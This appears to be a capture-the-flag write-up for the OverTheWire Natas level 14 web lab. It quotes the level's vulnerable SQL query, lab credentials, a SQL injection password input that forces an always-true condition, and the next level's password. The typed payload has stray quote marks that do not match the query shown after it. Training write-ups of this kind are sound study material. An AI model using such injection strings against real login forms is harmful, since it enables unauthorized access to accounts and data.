# Natas Level 14
The ***URL*** to which you need to connect is *http://natas14.natas.labs.overthewire.org*. The ***username*** is *natas14* and the ***password*** is *Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1*. 

Lets check the [viewsource](http://natas14.natas.labs.overthewire.org/index-source.html) link.
By analyzing the php script in the source code We see that we can inject some sql filter in the where.

```SQL
SELECT * from users where username="$username" and password="$password"
```

So if we enter in username something like this 'reda' and in the password 'reda" Or' "1"="1'.

```
Username: reda
Password: reda" Or' "1"="1
```

```SQL
SELECT * from users where username="reda" and password="reda" Or "1"="1"
```

```
The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
```
